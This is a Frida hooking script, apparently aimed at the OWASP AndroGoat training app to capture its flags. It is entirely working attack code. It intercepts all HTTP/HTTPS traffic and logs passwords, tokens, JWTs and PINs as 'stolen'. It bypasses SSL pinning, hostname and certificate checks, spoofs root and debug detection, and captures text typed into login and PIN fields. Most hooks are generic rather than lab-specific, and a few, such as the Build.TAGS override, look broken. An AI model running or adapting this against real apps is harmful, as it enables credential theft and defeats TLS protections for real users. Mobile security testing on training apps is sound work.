Java.perform(function() {
    console.log("[🎯] OWASP Goat Advanced Interceptor Started");
    console.log("[📡] Capturing ALL HTTP/HTTPS traffic + PIN inputs + Flags");

    // Yardımcı Fonksiyonlar
    function truncate(str, n) {
        if (!str) return "";
        return (str.length > n) ? str.substr(0, n - 1) + "…" : str;
    }

    function readAllFromStream(inputStream) {
        var ByteArrayOutputStream = Java.use("java.io.ByteArrayOutputStream");
        var baos = ByteArrayOutputStream.$new();
        var len = 0;

        try {
            var tempBuffer = Java.array('byte', new Array(1024));
            while ((len = inputStream.read(tempBuffer)) != -1) {
                baos.write(tempBuffer, 0, len);
            }
            var byteArray = baos.toByteArray();
            var result = Java.use("java.lang.String").$new(byteArray);
            return result;
        } catch (e) {
            console.log("[⚠️] Stream read error: " + e);
            return "";
        } finally {
            baos.close();
        }
    }

    function getResourceName(viewId) {
        try {
            var ActivityThread = Java.use("android.app.ActivityThread");
            var app = ActivityThread.currentApplication();
            if (app) {
                return app.getResources().getResourceEntryName(viewId);
            }
        } catch (e) {}
        return null;
    }

    function isSensitiveEndpoint(url) {
        var sensitivePaths = [
            "/login", "/auth", "/token", "/register", 
            "/password", "/user", "/account", "/api",
            "/oauth", "/verify", "/reset", "/change",
            "/signin", "/signup", "/flags", "/admin",
            "/insecureBanking", "/debug", "/config", "/flag",
            "/validatePin", "/pin", "/submitPin", "/checkPin"
        ];
        return sensitivePaths.some(function(path) {
            return url.indexOf(path) !== -1;
        });
    }

    function isSensitiveHeader(headerName) {
        var sensitiveHeaders = [
            "authorization", "token", "cookie", "session",
            "apikey", "password", "credential", "bearer",
            "x-api-key", "access-token", "secret"
        ];
        headerName = headerName.toLowerCase();
        return sensitiveHeaders.some(function(sensitive) {
            return headerName.indexOf(sensitive) !== -1;
        });
    }

    function containsSensitiveData(text) {
        if (!text || typeof text !== 'string') return false;
        var sensitivePatterns = [
            /password[=:]["']?([^"'\s&]+)/i,
            /token[=:]["']?([^"'\s&]+)/i,
            /auth[=:]["']?([^"'\s&]+)/i,
            /session[=:]["']?([^"'\s&]+)/i,
            /["']access_token["']\s*:\s*["']([^"']+)["']/,
            /["']refresh_token["']\s*:\s*["']([^"']+)["']/,
            /["']api[_-]?key["']\s*[:=]\s*["']([^"']+)["']/i,
            /email[=:]["']?([^"'\s&]+)/i,
            /username[=:]["']?([^"'\s&]+)/i,
            /flag[{]/i,
            /pin[=:]["']?(\d{4,6})["']/i
        ];
        return sensitivePatterns.some(function(pattern) {
            return pattern.test(text);
        });
    }

    function stealCredentials(data) {
        var patterns = {
            "password": /(?:password|pass|pwd)[=:]["']?([^"'\s&]+)/i,
            "token": /(?:token|access_token|auth_token)[=:]["']?([^"'\s&]+)/i,
            "username": /(?:username|user|email|login)[=:]["']?([^"'\s&]+)/i,
            "pin": /(?:pin|code)[=:]["']?(\d{4,6})["']/i
        };
        for (var key in patterns) {
            if (patterns.hasOwnProperty(key)) {
                var match = data.match(patterns[key]);
                if (match && match[1]) {
                    console.log("[🎯] STOLEN " + key.toUpperCase() + ": " + match[1]);
                    if (key === "pin") {
                        console.log("[🔢] PIN ENTERED — POSSIBLE FLAG TRIGGER!");
                    }
                }
            }
        }
    }

    function extractTokens(data) {
        var jwtPattern = /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g;
        var matches = data.match(jwtPattern);
        if (matches) {
            for (var i = 0; i < matches.length; i++) {
                var token = matches[i];
                console.log("[🎯] JWT TOKEN " + (i + 1) + ": " + truncate(token, 80));
                try {
                    var payload = token.split('.')[1];
                    while (payload.length % 4 !== 0) {
                        payload += "=";
                    }
                    var Base64 = Java.use("android.util.Base64");
                    var decodedBytes = Base64.decode(payload, 0);
                    var decodedStr = Java.use("java.lang.String").$new(decodedBytes);
                    var decoded = JSON.parse(decodedStr);
                    console.log("[🔓] DECODED PAYLOAD: " + JSON.stringify(decoded, null, 2));
                } catch (e) {
                    console.log("[⚠️] Token decode failed: " + e);
                }
            }
        }

        // FLAG ARAMA
        var flagPattern = /(flag\{[^}]+\})/g;
        var flagMatches = data.match(flagPattern);
        if (flagMatches) {
            for (var j = 0; j < flagMatches.length; j++) {
                console.log("[🚩🚩🚩 SECRET FLAG CAPTURED: " + flagMatches[j] + " 🚩🚩🚩");
            }
        }
    }

    function isSqlInjectionVulnerable(sql) {
        if (!sql) return false;
        sql = sql.toLowerCase();
        return sql.includes(" or 1=1") ||
               sql.includes(" union select") ||
               sql.includes("--") ||
               sql.includes(";--") ||
               sql.includes("/*") ||
               (sql.match(/'/g) || []).length > 2;
    }

    function containsSensitiveField(resourceName) {
        if (!resourceName) return false;
        resourceName = resourceName.toLowerCase();
        var sensitiveFields = [
            "password", "pass", "user", "email", 
            "login", "auth", "token", "credential",
            "pin", "secret", "apikey", "flag", "code"
        ];
        return sensitiveFields.some(function(field) {
            return resourceName.indexOf(field) !== -1;
        });
    }

    // 1. OKHTTP3 + HTTP URL CONNECTION TRAFİK YAKALAMA
    function captureSensitiveData() {
        // OKHTTP INTERCEPTOR
        try {
            var Interceptor = Java.use("okhttp3.Interceptor");
            var MyInterceptor = Java.registerClass({
                name: 'com.example.MyInterceptor',
                implements: [Interceptor],
                methods: {
                    intercept: function(chain) {
                        var request = chain.request();
                        var url = request.url().toString();
                        var method = request.method();

                        console.log("\n[🌐] → REQUEST: " + method + " " + url);

                        // Headers
                        var headers = request.headers();
                        for (var i = 0; i < headers.size(); i++) {
                            var name = headers.name(i);
                            var value = headers.value(i);
                            console.log("    HEADER: " + name + ": " + value);
                            if (isSensitiveHeader(name)) {
                                console.log("[🔑] STOLEN CREDENTIAL (Header): " + name + " = " + value);
                            }
                        }

                        // Body
                        if (request.body()) {
                            try {
                                var buffer = Java.use("okhttp3.Buffer").$new();
                                request.body().writeTo(buffer);
                                var bodyStr = buffer.readUtf8();
                                console.log("    BODY: " + truncate(bodyStr, 300));
                                if (containsSensitiveData(bodyStr)) {
                                    stealCredentials(bodyStr);
                                }
                            } catch (e) {
                                console.log("    [⚠️] Body read error: " + e);
                            }
                        }

                        // Proceed
                        var response = chain.proceed(request);

                        // Response
                        console.log("[🌐] ← RESPONSE: " + response.code() + " " + url);
                        var respHeaders = response.headers();
                        for (var i = 0; i < respHeaders.size(); i++) {
                            var name = respHeaders.name(i);
                            var value = respHeaders.value(i);
                            console.log("    HEADER: " + name + ": " + value);
                        }

                        var responseBody = response.body();
                        if (responseBody) {
                            var source = responseBody.source();
                            source.request(Java.use("java.lang.Long").MAX_VALUE);
                            var buffer = source.buffer().clone();
                            var respBodyStr = buffer.readUtf8();
                            console.log("    BODY: " + truncate(respBodyStr, 500));
                            if (containsSensitiveData(respBodyStr)) {
                                extractTokens(respBodyStr);
                                stealCredentials(respBodyStr);
                            }
                        }

                        return response;
                    }
                }
            });

            // OkHttpClient.Builder.build() hook
            var OkHttpClientBuilder = Java.use("okhttp3.OkHttpClient$Builder");
            OkHttpClientBuilder.build.implementation = function() {
                this.addInterceptor(MyInterceptor.$new());
                console.log("[✅] OkHttp Interceptor installed — ALL TRAFFIC LOGGED!");
                return this.build();
            };

        } catch (e) {
            console.log("[⚠️] OkHttp interceptor setup error: " + e);
        }

        // URLConnection FALLBACK
        try {
            var HttpURLConnection = Java.use("java.net.HttpURLConnection");

            HttpURLConnection.getInputStream.implementation = function() {
                var url = this.getURL().toString();
                var inputStream = this.getInputStream();
                var responseData = readAllFromStream(inputStream);

                console.log("\n[🌐] ← RESPONSE (URLConnection): " + url);
                console.log("    BODY: " + truncate(responseData, 500));

                if (containsSensitiveData(responseData)) {
                    extractTokens(responseData);
                    stealCredentials(responseData);
                }

                var ByteArrayInputStream = Java.use("java.io.ByteArrayInputStream");
                var StringClass = Java.use("java.lang.String");
                return ByteArrayInputStream.$new(StringClass.$new(responseData).getBytes());
            };

        } catch (e) {
            console.log("[⚠️] URLConnection hook error: " + e);
        }
    }

    // 2. GÜVENLİK BYPASS
    function bypassSecurityMeasures() {
        // SSL PINNING
        try {
            var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
            X509TrustManager.checkServerTrusted.implementation = function(chain, authType) {
                console.log("[🔓] SSL PINNING BYPASSED");
                return;
            };
        } catch (e) { console.log("[⚠️] SSL bypass error: " + e); }

        // HOSTNAME VERIFIER
        try {
            var HostnameVerifier = Java.use("javax.net.ssl.HostnameVerifier");
            HostnameVerifier.verify.implementation = function(hostname, session) {
                console.log("[🔓] HOSTNAME VERIFIER BYPASSED: " + hostname);
                return true;
            };
        } catch (e) { console.log("[⚠️] Hostname verifier bypass error: " + e); }

        // CERTIFICATE VALIDATION (TÜM OVERLOADLAR)
        try {
            var Certificate = Java.use("java.security.cert.Certificate");
            Certificate.verify.overload('java.security.PublicKey').implementation = function(key) {
                console.log("[🔓] CERTIFICATE VALIDATION BYPASSED (PublicKey)");
                return;
            };
            Certificate.verify.overload('java.security.PublicKey', 'java.lang.String').implementation = function(key, sigProvider) {
                console.log("[🔓] CERTIFICATE VALIDATION BYPASSED (PublicKey + Provider String)");
                return;
            };
            Certificate.verify.overload('java.security.PublicKey', 'java.security.Provider').implementation = function(key, sigProvider) {
                console.log("[🔓] CERTIFICATE VALIDATION BYPASSED (PublicKey + Provider Object)");
                return;
            };
        } catch (e) { console.log("[⚠️] Certificate bypass error: " + e); }
    }

    // 3. AUTHENTICATION INTERCEPT — PIN DAHİL!
    function interceptAuthentication() {
        try {
            var EditText = Java.use("android.widget.EditText");
            EditText.getText.overload().implementation = function() {
                var editable = this.getText(); // Editable tipinde
                var text = editable ? editable.toString() : ""; // 👈👈👈 BURASI DÜZELTİLDİ!
                var viewId = this.getId();
                var resourceName = getResourceName(viewId);
                if (resourceName && containsSensitiveField(resourceName)) {
                    console.log("[🔑] INPUT CAPTURE: " + resourceName + " = " + text);
                    if (resourceName.includes("pin") && text.match(/^\d{4,6}$/)) {
                        console.log("[🔢] PIN ENTERED: " + text + " — CHECKING FOR FLAG...");
                    }
                }
                return this.getText(); // orijinal Editable nesnesini döndür
            };

            var Button = Java.use("android.widget.Button");
            Button.performClick.implementation = function() {
                var viewId = this.getId();
                var resourceName = getResourceName(viewId);
                if (resourceName && (resourceName.toLowerCase().includes("login") || resourceName.includes("pin"))) {
                    console.log("[🎯] ACTION BUTTON CLICKED: " + resourceName);
                }
                return this.performClick();
            };
        } catch (e) { console.log("[⚠️] Authentication intercept error: " + e); }
    }

    // 4. DATABASE MONITOR
    function monitorDatabaseOperations() {
        try {
            var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
            SQLiteDatabase.execSQL.overload('java.lang.String').implementation = function(sql) {
                if (containsSensitiveData(sql)) {
                    console.log("[🗄️] DATABASE QUERY: " + sql);
                    if (isSqlInjectionVulnerable(sql)) {
                        console.log("[💉] SQL INJECTION VULNERABILITY DETECTED!");
                    }
                }
                return this.execSQL(sql);
            };
        } catch (e) { console.log("[⚠️] Database monitor error: " + e); }
    }

    // 5. ROOT & DEBUG BYPASS
    function detectRootAndDebug() {
        try {
            var File = Java.use("java.io.File");
            File.exists.implementation = function() {
                var path = this.getAbsolutePath();
                var rootIndicators = ["su", "busybox", "Superuser", "magisk", "xposed", "/system/bin", "/system/xbin"];
                for (var i = 0; i < rootIndicators.length; i++) {
                    if (path.includes(rootIndicators[i])) {
                        console.log("[🔓] ROOT DETECTION BYPASSED: " + path);
                        return false;
                    }
                }
                return this.exists();
            };

            var Build = Java.use("android.os.Build");
            Build.TAGS.implementation = function() { return "release-keys"; };

            try {
                var BuildConfig = Java.use("owasp.sat.agoat.BuildConfig");
                BuildConfig.DEBUG.value = false;
                console.log("[🔓] BuildConfig.DEBUG overridden to false");
            } catch (e) { console.log("[⚠️] BuildConfig.DEBUG not accessible"); }

            try {
                var SystemProperties = Java.use("android.os.SystemProperties");
                SystemProperties.getBoolean.overload('java.lang.String', 'boolean').implementation = function(key, def) {
                    if (key === "ro.debuggable") {
                        console.log("[🔓] DEBUG FLAG BYPASSED via SystemProperties");
                        return false;
                    }
                    return this.getBoolean(key, def);
                };
            } catch (e) { console.log("[⚠️] SystemProperties bypass not available"); }

        } catch (e) { console.log("[⚠️] Root/Debug bypass error: " + e); }
    }

    // TÜM HOOKLARI BAŞLAT
    captureSensitiveData();
    bypassSecurityMeasures();
    interceptAuthentication();
    monitorDatabaseOperations();
    detectRootAndDebug();

    console.log("[✅] ALL HOOKS ACTIVE — READY TO CAPTURE FLAGS & PINS");
    console.log("[🔓] SSL, ROOT, DEBUG — BYPASSED");
    console.log("[🔍] Waiting for you to enter PIN or trigger API...");

    // OPTIONAL: Real-time heartbeat
    setInterval(function() {
        console.log("[👁️] OWASP Goat Interceptor — monitoring for flags and secrets...");
    }, 10000);
});